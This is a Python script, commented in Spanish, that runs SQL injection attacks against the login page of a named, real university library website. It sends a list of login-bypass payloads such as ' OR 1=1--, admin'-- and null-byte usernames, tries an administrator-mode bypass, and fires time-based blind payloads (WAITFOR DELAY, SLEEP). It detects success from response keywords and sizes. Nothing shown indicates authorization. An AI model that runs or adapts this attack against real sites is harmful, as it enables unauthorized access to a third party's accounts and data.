#!/usr/bin/env python3
"""
SQLi test en biblioteca.uns.edu.pe/login.asp
ASP clasico - tipicamente vulnerable a SQLi en login sin prepared statements
El backend probablemente hace:
  SELECT * FROM usuarios WHERE usuario='{t_usuario}' AND clave='{t_clave}'
"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

import requests, urllib3, hashlib, time, re
urllib3.disable_warnings()

BASE    = "https://biblioteca.uns.edu.pe"
TARGET  = BASE + "/login.asp"
REFERER = BASE + "/inicia_sesion.asp"

SESS = requests.Session()
SESS.verify = False
SESS.headers.update({
    "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer":      REFERER,
    "Content-Type": "application/x-www-form-urlencoded",
})

# ── Baseline: request de fallo (para comparar) ──────────────
def get_baseline():
    r = SESS.post(TARGET,
                  data={"t_usuario": "usuario_que_no_existe_xyz", "t_clave": "pass_incorrecta_xyz", "modo": "U"},
                  allow_redirects=True, timeout=10)
    return r.status_code, r.url, len(r.content), r.text[:200]

status0, url0, size0, body0 = get_baseline()
print(f"=== SQLi Test — {TARGET} ===\n")
print(f"Baseline (fallo): HTTP {status0} | URL: {url0} | {size0}b")
print(f"Preview: {body0[:100]}\n")

FAIL_URL = url0  # URL de redirect en caso de fallo

# ── Funcion de test ─────────────────────────────────────────
results = []

def test_sqli(label, usuario, clave_raw, modo="U"):
    """
    clave_raw: si empieza con MD5: lo envia tal cual.
               sino lo envia como texto plano (para sqli en clave).
    """
    data = {"t_usuario": usuario, "t_clave": clave_raw, "modo": modo, "B1": "Iniciar+Sesión"}
    r = SESS.post(TARGET, data=data, allow_redirects=True, timeout=10)

    final_url   = r.url
    size        = len(r.content)
    status      = r.status_code
    body        = r.text

    # Detectar exito:
    # - URL final distinta a la de fallo
    # - Contenido diferente al baseline
    # - Palabras de bienvenida / panel
    success_keywords = ["bienvenido", "welcome", "sesion iniciada", "logout",
                        "cerrar sesion", "perfil", "panel", "dashboard",
                        "inicio", "menu", "principal", "salir"]
    fail_keywords    = ["inicia_sesion", "login", "usuario o contrase", "error",
                        "incorrecta", "invalido", "intentelo"]

    in_success = any(k in body.lower() for k in success_keywords)
    in_fail    = any(k in body.lower() for k in fail_keywords)

    different_url  = (final_url != FAIL_URL and "inicia_sesion" not in final_url.lower())
    different_size = abs(size - size0) > 500

    verdict = "❌ FAIL"
    if in_success and not in_fail:
        verdict = "✅ LOGIN OK"
    elif different_url and different_size and not in_fail:
        verdict = "⚠️  DIFERENTE (analizar)"
    elif different_url:
        verdict = "🔄 URL distinta"

    icon = "🔴" if "OK" in verdict else ("🟡" if "DIFERENTE" in verdict or "distinta" in verdict else "  ")
    print(f"  {icon} [{label}]")
    print(f"       usuario={repr(usuario[:50])} | clave={repr(clave_raw[:30])}")
    print(f"       HTTP {status} | URL: {final_url} | {size}b | {verdict}")
    if "OK" in verdict or "DIFERENTE" in verdict:
        print(f"       Body preview: {body[:300]}")
    print()

    results.append((label, usuario, clave_raw, verdict, final_url, size))
    time.sleep(0.4)

# ── Payloads SQLi — campo usuario (mas prometedor) ──────────
print("=== FASE 1: SQLi en campo t_usuario ===\n")

# MD5 de string vacio / comun para que la comparacion de clave no rompa
md5_any = hashlib.md5(b"cualquier").hexdigest()

sqli_usuario = [
    # Bypass clasico con comentario SQL Server / Access
    ("bypass ' OR 1=1--",           "' OR 1=1--",                  md5_any),
    ("bypass ' OR '1'='1",          "' OR '1'='1",                 md5_any),
    ("bypass admin'--",             "admin'--",                     md5_any),
    ("bypass admin'#",              "admin'#",                      md5_any),
    ("bypass ' OR 1=1#",            "' OR 1=1#",                   md5_any),
    ("bypass ' OR 1=1;--",          "' OR 1=1;--",                 md5_any),
    ("bypass '/**/OR/**/1=1--",     "'/**/OR/**/1=1--",            md5_any),
    # Access DB especificos
    ("bypass Access OR true",       "' OR True--",                  md5_any),
    ("bypass Access ' OR 'a'='a",   "' OR 'a'='a",                 md5_any),
    # Null byte
    ("bypass null byte",            "admin\x00",                    md5_any),
    # Modo admin con bypass
    ("bypass modo=A",               "' OR 1=1--",                  md5_any),
    # Username comunes + bypass
    ("admin sin pass",              "admin",                        ""),
    ("bibliotecario bypass",        "bibliotecario'--",             md5_any),
    ("biblioteca bypass",           "biblioteca'--",                md5_any),
]

for label, usuario, clave in sqli_usuario:
    if label == "bypass modo=A":
        # Probar tambien con modo=A (rol administrador)
        test_sqli(label + " [modo=A]", usuario, clave, modo="A")
    else:
        test_sqli(label, usuario, clave)

# ── Payloads SQLi — campo clave (sin MD5) ───────────────────
print("=== FASE 2: SQLi en campo t_clave (sin MD5) ===\n")

sqli_clave = [
    ("clave bypass ' OR '1'='1",    "admin",    "' OR '1'='1"),
    ("clave bypass ' OR 1=1--",     "admin",    "' OR 1=1--"),
    ("clave bypass '--",            "admin",    "'--"),
    ("clave bypass ' OR 'x'='x",   "admin",    "' OR 'x'='x"),
]

for label, usuario, clave in sqli_clave:
    test_sqli(label, usuario, clave)

# ── Time-based blind SQLi (SQL Server) ──────────────────────
print("=== FASE 3: Time-based Blind SQLi (SQL Server WAITFOR) ===\n")

import time as tmod

blind_payloads = [
    ("WAITFOR DELAY 3s",  "'; WAITFOR DELAY '0:0:3'--",   md5_any),
    ("SLEEP 3s (MySQL)",  "' OR SLEEP(3)--",              md5_any),
    ("IIF Access delay",  "' OR IIF(1=1,1,0)='1",        md5_any),
]

for label, usuario, clave in blind_payloads:
    t_start = tmod.time()
    data = {"t_usuario": usuario, "t_clave": clave, "modo": "U"}
    try:
        r = SESS.post(TARGET, data=data, allow_redirects=True, timeout=15)
        elapsed = tmod.time() - t_start
        delay_detected = elapsed >= 2.5
        icon = "🔴" if delay_detected else "  "
        print(f"  {icon} [{label}] elapsed={elapsed:.2f}s {'<< DELAY DETECTADO!' if delay_detected else ''}")
        print(f"       payload: {repr(usuario[:60])}")
    except Exception as e:
        print(f"  [ERROR] {label}: {e}")
    print()
    time.sleep(0.5)

# ── Resumen ──────────────────────────────────────────────────
print("=== RESUMEN ===")
wins  = [r for r in results if "OK" in r[3] or "DIFERENTE" in r[3]]
diffs = [r for r in results if "distinta" in r[3]]

if wins:
    print(f"\n🔴 LOGIN EXITOSO / COMPORTAMIENTO ANOMALO en {len(wins)} payload(s):")
    for label, u, c, verdict, url, size in wins:
        print(f"   [{verdict}] {label}")
        print(f"   usuario={repr(u[:60])} | clave={repr(c[:30])}")
        print(f"   URL: {url} | {size}b")
elif diffs:
    print(f"\n🟡 URL distinta en {len(diffs)} caso(s) — revisar manualmente")
    for label, u, c, verdict, url, size in diffs:
        print(f"   {label} | URL: {url}")
else:
    print("\n  No se confirmo SQLi por bypass de login.")
    print("  El servidor parece filtrar o usar parameterized queries.")
    print("  Considerar: error-based SQLi o analisis via Burp Suite manualmente.")
